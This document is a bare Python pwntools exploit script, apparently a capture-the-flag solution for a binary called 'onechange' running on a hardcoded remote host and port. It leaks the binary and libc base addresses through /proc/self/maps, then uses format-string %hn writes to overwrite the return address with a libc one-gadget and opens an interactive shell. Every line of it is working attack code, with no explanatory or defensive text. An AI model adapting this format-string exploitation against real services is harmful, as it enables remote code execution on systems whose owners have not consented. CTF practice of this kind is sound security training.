#!/usr/bin/env python
from pwn import *
import sys

HOST = '103.237.99.35'
PORT = 26125

def info(s):
	log.info(s)


def exploit(p):
	p.sendlineafter("right !!","/proc/self/maps")
	l=p.recvuntil("you ")
	l=l.split('\n')
	basebin=int(l[2].split("-")[0],16)
	baselibc=0
	for c in l:
		if "/lib/" in c:
			baselibc=int(c.split('-')[0],16)
			break
	info("basebin at 0x%x\nbaselibc at 0x%x\n"%(basebin,baselibc))
	one=baselibc+0x45216
	info("one at 0x%x"%one)
	magic=basebin+0x2020C0-0x201df0
	info("magic at 0x%x"%magic)
	main=basebin+0x9BA
	payload=[]
	payload.append(p64(main))
	payload.append("|%13$p|")
	payload.append("%"+str(magic&0xffff)+"x%14$hn")
	p.send(str(len(payload)))
	for c in payload:
		p.sendline(c)

	p.recvuntil('|')
	rip=int(p.recvuntil("|")[:-1],16)-0x128
	info("rip at 0x%x"%rip)
	payload=[]
	payload.append("%"+str(rip&0xffff)+"x%37$hn")
	payload.append("%"+str(one&0xffff)+"x%32$hn")
	payload.append("%"+str((rip+2)&0xffff)+"x%37$hn")
	payload.append("%"+str((one>>16)&0xffff)+"x%32$hn")
	p.sendlineafter("right !!","/proc/self/maps")
	p.sendafter("number ?",str(len(payload)))
	for c in payload:
		p.sendline(c)
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('./onechange')
		print util.proc.pidof(p)
		pause()
		
		exploit(p)
		
	else:
		p=remote(HOST,PORT)
		exploit(p)
